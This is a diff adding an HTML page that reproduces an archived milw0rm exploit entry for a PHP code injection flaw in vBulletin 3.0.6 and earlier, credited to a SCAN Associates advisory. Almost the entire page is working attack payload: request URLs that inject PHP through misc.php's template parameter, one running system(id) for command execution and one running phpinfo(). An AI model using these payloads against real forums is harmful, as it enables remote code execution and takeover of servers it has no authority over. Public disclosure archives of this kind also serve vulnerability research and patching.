@@ -1,0 +1,19 @@
+<html>
+<head>
+<title>vBulletin <= 3.0.6 php Code Injection</title>
+<pre>
+# Tested on vBulletin Version 3.0.1 /str0ke 
+# http://www.xxx.net/misc.php?do=page&amp;template={${system(id)}} 
+#
+
+# [SCAN Associates Security Advisory]
+# http://www.scan-associates.net
+
+Proof of concept
+================
+http://site.com/misc.php?do=page&amp;template={${phpinfo()}}
+
+# milw0rm.com [2005-02-22]
+</pre>
+</html>
+
